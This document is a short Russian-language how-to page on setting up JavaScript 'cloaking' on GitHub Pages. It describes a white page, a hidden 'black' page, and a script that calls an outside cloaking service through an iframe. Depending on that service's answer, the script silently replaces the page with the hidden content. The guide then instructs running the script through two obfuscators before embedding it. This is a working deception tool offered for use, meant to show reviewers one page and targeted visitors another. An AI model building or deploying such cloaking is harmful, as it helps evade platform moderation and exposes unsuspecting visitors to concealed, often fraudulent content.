---
title: "Настройка JS клоаки"
date: 2019-10-25T17:31:01+03:00
draft: false
---

## Вводные

В корне гитхаба должно быть 3 файла:

- файл `w.html` - это белая страница
- файл `black.html` - это прокладка
- файл `blog.html` - это копия белой страницы с клоакой, на которую будет идти трафик

## Установка клоаки

1. Отредактировать код:
{{< highlight js >}}
$(function () {
    $('body').append('<iframe src="https://beta.dolphin.ru.com/magic/rukz.php?domain=ДОМЕН-GITHUB&path=ИМЯ-РЕПОЗИТОРИЯ"></iframe>');
    setTimeout(function () {
        var html = $('iframe').contents().find('html').html();
        var frameLocation = window.frames[0].location.href;
        if (frameLocation.search('black.html') != -1) {
            document.open();
            document.write(html);
            document.close();
        }
        $('iframe').remove();
    }, 1500);
});
{{< / highlight >}}
2. Прогнать код через <a href="https://obfuscator.io/" target="_blank">обфускатор1</a>
3. Проганать код через <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank">обфускатор2</a>
4. Создать файл `js/1.js` и вставить результат работы обфускатора в него
5. Вставить на странице `white.html` перед закрывающим `</body>` код:
{{< highlight html >}}
<script src="js/1.js"></script>
{{< / highlight >}}